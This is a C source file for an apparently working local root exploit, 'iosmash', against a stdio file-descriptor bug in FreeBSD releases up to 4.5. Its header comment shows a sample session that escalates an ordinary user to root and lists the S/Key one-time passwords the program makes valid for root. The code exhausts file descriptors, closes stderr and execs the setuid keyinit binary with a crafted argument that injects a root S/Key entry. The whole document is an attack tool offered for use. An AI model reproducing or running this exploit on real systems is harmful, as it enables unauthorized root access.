/*
  phased/b10z
  phased@snosoft.com
  23/04/2002

  stdio kernel bug in All releases of FreeBSD up to and including 4.5-RELEASE 
  decided to make a trivial exploit to easily get root :)

  > id
  uid=1003(phased) gid=999(phased) groups=999(phased)
  > ./iosmash
  Adding phased:
  <--- HIT CTRL-C ---> 
  > su
  s/key 98 snosoft2
  Password:MASS OAT ROLL TOOL AGO CAM
  xes# 

  this program makes the following skeys valid

  95: CARE LIVE CARD LOFT CHIC HILL
  96: TESS OIL WELD DUD MUTE KIT
  97: DADE BED DRY JAW GRAB NOV
  98: MASS OAT ROLL TOOL AGO CAM
  99: DARK LEW JOLT JIVE MOS WHO

  http://www.snosoft.com
  cheers Joost Pol
*/

#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
        while(dup(1) != -1);
        close(2);
        execl("/usr/bin/keyinit",
        "\nroot 0099 snosoft2   6f648e8bd0e2988a     Apr 23,2666 01:02:03\n");
}
